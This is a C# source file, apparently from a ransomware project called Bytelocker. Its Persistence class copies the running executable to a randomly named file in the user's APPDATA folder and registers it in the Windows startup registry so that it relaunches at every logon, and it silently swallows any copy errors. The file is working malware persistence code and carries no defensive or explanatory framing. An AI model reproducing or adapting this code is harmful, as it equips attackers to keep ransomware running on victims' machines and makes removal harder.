using System;
using System.Diagnostics;
using System.IO;
using ByteLocker.Detection;
using Bytelocker.Settings;

namespace Bytelocker.Installer
{
    internal class Persistence
    {
        public static string REGISTRY_STARTUP_VALUE_NAME = "Bytelocker";
        private string new_path;

        private string path;
        private string random_guid;

        public Persistence()
        {
            GetRandomGUID();
            GetPath();
            SetNewPath();
            AddToStartup();
            CopyFile();
        }

        private void GetRandomGUID()
        {
            random_guid = RandomFileNameGenerator.GetRandomGUID();
        }

        private void GetPath()
        {
            path = Process.GetCurrentProcess().MainModule.FileName;
        }

        private void SetNewPath()
        {
            new_path = Environment.GetEnvironmentVariable("APPDATA") + @"\" + random_guid;
        }

        private void AddToStartup()
        {
            var rm = new RegistryManager();
            rm.AddItemToStartup(REGISTRY_STARTUP_VALUE_NAME, new_path, "");
        }

        private void CopyFile()
        {
            try
            {
                File.Copy(path, new_path);
            }
            catch (Exception)
            {
            }
        }
    }
}